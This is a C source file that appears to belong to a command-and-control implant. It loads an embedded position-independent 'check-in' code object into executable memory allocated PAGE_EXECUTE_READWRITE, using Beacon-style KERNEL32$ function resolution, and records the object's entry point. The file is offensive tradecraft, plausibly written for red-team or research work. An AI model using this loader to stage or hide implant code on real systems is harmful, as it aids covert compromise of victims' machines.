#include <windows.h>
#include "headers/celebi.h"
#include "headers/tcg.h"

WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);

char __CHECKIN_PICO__[0] __attribute__((section("pico_checkin")));

char * find_checkin_pico() {
    return (char *)&__CHECKIN_PICO__;
}

void load_picos(AgentCapabilities *cap) {
	char *src_pico;
	
	WIN32FUNCS funcs;
	funcs.LoadLibraryA = (__typeof__(LoadLibraryA) *) KERNEL32$LoadLibraryA;
	funcs.GetProcAddress = (__typeof__(GetProcAddress) *) KERNEL32$GetProcAddress;
	funcs.VirtualAlloc = (__typeof__(VirtualAlloc) *) KERNEL32$VirtualAlloc;
	funcs.VirtualFree = (__typeof__(VirtualFree) *) KERNEL32$VirtualFree;
	
	src_pico = find_checkin_pico();
	cap->CheckinPicoCode = KERNEL32$VirtualAlloc(NULL, PicoCodeSize(src_pico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
	cap->CheckinPicoData = KERNEL32$VirtualAlloc(NULL, PicoDataSize(src_pico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
	PicoLoad((IMPORTFUNCS *) &funcs, src_pico, cap->CheckinPicoCode, cap->CheckinPicoData);
	cap->CheckinPicoEntrypoint = (CHECKIN_PICO) PicoEntryPoint(src_pico, cap->CheckinPicoCode);
}

void free_picos(AgentCapabilities *cap) {
	KERNEL32$VirtualFree(cap->CheckinPicoCode, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(cap->CheckinPicoData, 0, MEM_RELEASE);
}
